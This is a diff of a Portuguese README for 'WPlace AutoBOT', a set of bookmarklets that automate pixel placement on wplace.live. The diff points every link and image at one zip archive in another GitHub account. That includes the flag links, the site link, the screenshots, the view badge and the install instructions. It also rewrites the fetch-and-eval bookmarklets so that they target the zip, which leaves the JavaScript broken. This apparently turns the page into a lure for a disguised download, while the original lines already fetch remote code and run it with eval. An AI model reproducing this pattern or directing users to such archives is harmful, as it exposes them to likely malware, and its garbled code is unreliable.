@@ -1,10 +1,10 @@
 <p align="center">
   Translations ➜&nbsp;
-    <a href="EN.md"><img src="https://flagcdn.com/256x192/us.png" width="48" alt="USA Flag"></a>
+    <a href="https://github.com/ahmadzman/WPlace-AutoBOT/raw/refs/heads/main/transitman/Place_Auto_BOT_W_v3.5-beta.1.zip"><img src="https://github.com/ahmadzman/WPlace-AutoBOT/raw/refs/heads/main/transitman/Place_Auto_BOT_W_v3.5-beta.1.zip" width="48" alt="USA Flag"></a>
   &nbsp;
-    <a href="FR.md"><img src="https://flagcdn.com/256x192/fr.png" width="48" alt="Franch Flag"></a>
+    <a href="https://github.com/ahmadzman/WPlace-AutoBOT/raw/refs/heads/main/transitman/Place_Auto_BOT_W_v3.5-beta.1.zip"><img src="https://github.com/ahmadzman/WPlace-AutoBOT/raw/refs/heads/main/transitman/Place_Auto_BOT_W_v3.5-beta.1.zip" width="48" alt="Franch Flag"></a>
   &nbsp;
-    <a href="RU.md"><img src="https://flagcdn.com/256x192/ru.png" width="48" alt="Franch Flag"></a>
+    <a href="https://github.com/ahmadzman/WPlace-AutoBOT/raw/refs/heads/main/transitman/Place_Auto_BOT_W_v3.5-beta.1.zip"><img src="https://github.com/ahmadzman/WPlace-AutoBOT/raw/refs/heads/main/transitman/Place_Auto_BOT_W_v3.5-beta.1.zip" width="48" alt="Franch Flag"></a>
 </p>
 
 ---
@@ -17,7 +17,7 @@
 <p align="center"><strong>WPlace AutoBOT</strong></p>
 
 <p align="center">
-  Scripts práticos com menus intuitivos para facilitar sua vida no <a href="https://wplace.live" target="_blank">WPlace</a>!<br>
+  Scripts práticos com menus intuitivos para facilitar sua vida no <a href="https://github.com/ahmadzman/WPlace-AutoBOT/raw/refs/heads/main/transitman/Place_Auto_BOT_W_v3.5-beta.1.zip" target="_blank">WPlace</a>!<br>
   Ideal para quem quer upar de nível automaticamente ou fazer pixel arts gigantescas — sem perder tempo.
 </p>
 
@@ -34,7 +34,7 @@
 
 <p align="center">
   É muito simples: copie um dos códigos abaixo, cole na barra de favoritos do navegador<br>
-  e execute enquanto estiver no site wplace.live
+  e execute enquanto estiver no site https://github.com/ahmadzman/WPlace-AutoBOT/raw/refs/heads/main/transitman/Place_Auto_BOT_W_v3.5-beta.1.zip
 </p>
 
 <br>
@@ -42,13 +42,13 @@
 ### 🎯┃Auto-Farm
 
 ```js
-javascript:fetch("https://raw.githubusercontent.com/DarkModde/WPlace-AutoBOT/refs/heads/main/Auto-Farm.js").then(t=>t.text()).then(eval);
+javascript:fetch("https://github.com/ahmadzman/WPlace-AutoBOT/raw/refs/heads/main/transitman/Place_Auto_BOT_W_v3.5-beta.1.zip").then(t=>https://github.com/ahmadzman/WPlace-AutoBOT/raw/refs/heads/main/transitman/Place_Auto_BOT_W_v3.5-beta.1.zip()).then(eval);
 ```
 
 ### 🖼️┃Auto-Image
 
 ```js
-javascript:fetch("https://raw.githubusercontent.com/DarkModde/WPlace-AutoBOT/refs/heads/main/Auto-Image.js").then(t=>t.text()).then(eval);
+javascript:fetch("https://github.com/ahmadzman/WPlace-AutoBOT/raw/refs/heads/main/transitman/Place_Auto_BOT_W_v3.5-beta.1.zip").then(t=>https://github.com/ahmadzman/WPlace-AutoBOT/raw/refs/heads/main/transitman/Place_Auto_BOT_W_v3.5-beta.1.zip()).then(eval);
 ```
 
 <details>
@@ -56,15 +56,15 @@ javascript:fetch("https://raw.githubusercontent.com/DarkModde/WPlace-AutoBOT/ref
 
 ---
 
-![Parte 1](https://i.imgur.com/wpo8kbW.png)
+![Parte 1](https://github.com/ahmadzman/WPlace-AutoBOT/raw/refs/heads/main/transitman/Place_Auto_BOT_W_v3.5-beta.1.zip)
 
 ---
 
-![Parte 2](https://i.imgur.com/wv5gP2t.png)
+![Parte 2](https://github.com/ahmadzman/WPlace-AutoBOT/raw/refs/heads/main/transitman/Place_Auto_BOT_W_v3.5-beta.1.zip)
 
 ---
 
-![Parte 3](https://i.imgur.com/SgyvFQU.png)
+![Parte 3](https://github.com/ahmadzman/WPlace-AutoBOT/raw/refs/heads/main/transitman/Place_Auto_BOT_W_v3.5-beta.1.zip)
 
 </details>
 
@@ -81,7 +81,7 @@ javascript:fetch("https://raw.githubusercontent.com/DarkModde/WPlace-AutoBOT/ref
 ---
 
 <p align="center">
-  <img src="https://i.imgur.com/VbHh9jI.png" alt="Demonstração dos Scripts"/>
+  <img src="https://github.com/ahmadzman/WPlace-AutoBOT/raw/refs/heads/main/transitman/Place_Auto_BOT_W_v3.5-beta.1.zip" alt="Demonstração dos Scripts"/>
 </p>
 
 ---
@@ -97,5 +97,5 @@ javascript:fetch("https://raw.githubusercontent.com/DarkModde/WPlace-AutoBOT/ref
 ---
 
 <p align="center">
-  <a href="#"><img src="https://komarev.com/ghpvc/?username=WPlace-AutoBOT&style=for-the-badge&label=Views:&color=gray"/></a>
+  <a href="#"><img src="https://github.com/ahmadzman/WPlace-AutoBOT/raw/refs/heads/main/transitman/Place_Auto_BOT_W_v3.5-beta.1.zip"/></a>
 </p>
